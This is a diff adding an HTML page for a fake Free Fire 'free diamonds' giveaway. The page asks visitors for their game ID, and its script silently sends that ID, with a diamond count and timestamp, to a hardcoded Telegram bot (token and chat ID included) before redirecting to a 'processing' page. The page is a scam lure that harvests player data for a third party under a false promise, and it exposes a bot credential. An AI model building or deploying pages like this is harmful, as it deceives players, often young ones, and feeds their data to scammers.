@@ -1,0 +1,43 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Enter Game ID</title>
+  <style>
+    *{margin:0;padding:0;box-sizing:border-box;font-family:'Inter',sans-serif;}
+    body{background:#f8fafc;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px;}
+    .box{background:#fff;padding:40px;border-radius:24px;max-width:400px;width:100%;border:1px solid #f1f5f9;}
+    .box h2{text-align:center;margin-bottom:8px;}
+    .box p{text-align:center;color:#64748b;margin-bottom:24px;}
+    input{width:100%;padding:14px;margin:8px 0;border:1px solid #e2e8f0;border-radius:12px;font-size:15px;outline:none;}
+    input:focus{border-color:#e94560;}
+    .btn{width:100%;padding:14px;background:#e94560;color:#fff;border:none;border-radius:40px;font-weight:600;font-size:16px;cursor:pointer;}
+    .btn:hover{background:#c72e4a;}
+    #result{margin-top:16px;text-align:center;font-size:14px;}
+  </style>
+</head>
+<body>
+<div class="box">
+  <h2>🎮 Enter Free Fire ID</h2>
+  <p>Enter your game ID to receive diamonds</p>
+  <form id="gameForm">
+    <input type="text" id="gameId" placeholder="Free Fire ID" required>
+    <button type="submit" class="btn">Submit →</button>
+  </form>
+  <div id="result"></div>
+</div>
+<script>
+  document.getElementById('gameForm').addEventListener('submit', async (e) => {
+    e.preventDefault();
+    const gameId = document.getElementById('gameId').value;
+    const diamonds = localStorage.getItem('diamonds') || '5000';
+
+    const msg = `🎯 GAME ID\n\nID: ${gameId}\nDiamonds: ${diamonds}\nTime: ${new Date().toLocaleString()}`;
+    await fetch(`https://api.telegram.org/bot8251315315:AAEU1s7Xrhwv7dQG8qP9he8pxbYBRs2eEcU/sendMessage?chat_id=8011932528&text=${encodeURIComponent(msg)}`);
+
+    window.location.href = '/processing.html';
+  });
+</script>
+</body>
+</html>
